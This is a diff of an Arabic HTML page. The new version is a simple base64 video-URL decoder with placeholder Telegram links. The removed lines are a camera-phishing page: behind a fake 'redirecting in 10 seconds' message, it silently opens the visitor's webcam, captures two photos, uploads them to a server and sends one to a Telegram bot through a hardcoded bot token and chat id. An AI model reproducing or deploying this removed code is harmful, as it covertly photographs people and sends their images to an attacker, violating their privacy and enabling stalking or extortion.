@@ -1,78 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Image</title>
+    <title>عرض الفيديو المشفر</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+        }
+        .navbar {
+            background-color: #4CAF50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 36px;
+            font-weight: bold;
+        }
+        .container {
+            max-width: 800px;
+            margin: 80px auto;
+            background-color: #ffffff;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        input[type="text"] {
+            width: 90%;
+            padding: 15px;
+            margin: 25px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        video {
+            width: 100%;
+            height: auto;
+            margin-top: 30px;
+            border-radius: 10px;
+        }
+        .footer {
+            margin-top: 50px;
+            font-size: 18px;
+        }
+        .footer a {
+            color: #4CAF50;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
+    <div class="navbar">أدخل رابط الفيديو المشفر</div>
+    <div class="container">
+        <h1>أدخل رابط الفيديو المشفر لعرضه</h1>
+        <input type="text" id="encodedUrl" placeholder="أدخل رابط الفيديو المشفر هنا..." required>
+        <br>
+        <button onclick="decodeAndPlayVideo()">عرض الفيديو</button>
+        <div id="videoContainer" style="display: none; margin-top: 20px;">
+            <h2>الفيديو:</h2>
+            <video id="videoPlayer" controls>
+                <source id="videoSource" src="" type="video/mp4">
+                المتصفح الخاص بك لا يدعم تشغيل الفيديو.
+            </video>
+        </div>
+    </div>
+    <div class="footer">
+        <p>تابع قناتي على Telegram: <a href="https://t.me/your_channel" target="_blank">قناتي الرئيسية</a></p>
+        <p>قناتي الاحتياطية على Telegram: <a href="https://t.me/your_backup_channel" target="_blank">قناتي الاحتياطية</a></p>
+    </div>
+
     <script>
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-            var video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            var canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            var context = canvas.getContext('2d');
+        // دالة لفك التشفير من Base64
+        function decodeBase64(encodedStr) {
+            try {
+                // فك التشفير باستخدام atob (Base64)
+                return atob(encodedStr);
+            } catch (e) {
+                alert("حدث خطأ في فك التشفير. تأكد من أن الرابط المدخل مشفر بشكل صحيح.");
+                return null;
+            }
+        }
 
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                var image1 = canvas.toDataURL('image/png');
+        // دالة لعرض الفيديو بعد فك التشفير
+        function decodeAndPlayVideo() {
+            const encodedUrl = document.getElementById('encodedUrl').value;
+            const decodedUrl = decodeBase64(encodedUrl);
 
-                // إرسال الصورة إلى الخادم
-                fetch('/upload-image/{{user_id}}', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ image: image1 })
-                }).then(response => response.text())
-                  .then(data => {
-                      console.log(data);
-                      // بعد رفع الصورة، إرسالها إلى بوت تليجرام
-                      sendToTelegram(image1);
-                  });
-
-                setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    var image2 = canvas.toDataURL('image/png');
-
-                    // إرسال الصورة الثانية إلى الخادم
-                    fetch('/upload-image/{{user_id}}', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ image: image2 })
-                    }).then(response => response.text())
-                      .then(data => console.log(data));
-
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-            }, 1000);
-        })
-        .catch(function(err) {
-            console.log("حدث خطأ: " + err);
-        });
-
-        // دالة إرسال الصورة إلى بوت تليجرام
-        function sendToTelegram(imageData) {
-            const botToken = '1847511046:AAEsoNnXney4bDcYgrwUFT15aMAXJI3pT_k';
-            
-            const chatId = 1418250346;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: new URLSearchParams({
-                    chat_id: chatId,
-                    photo: imageData
-                })
-            }).then(response => response.json())
-              .then(data => console.log('تم إرسال الصورة بنجاح إلى تليجرام:', data))
-              .catch(error => console.error('حدث خطأ أثناء إرسال الصورة إلى تليجرام:', error));
+            if (decodedUrl) {
+                // عرض الفيديو في المشغل
+                document.getElementById('videoSource').src = decodedUrl;
+                document.getElementById('videoPlayer').load();
+                document.getElementById('videoContainer').style.display = 'block';
+            }
         }
     </script>
 </body>
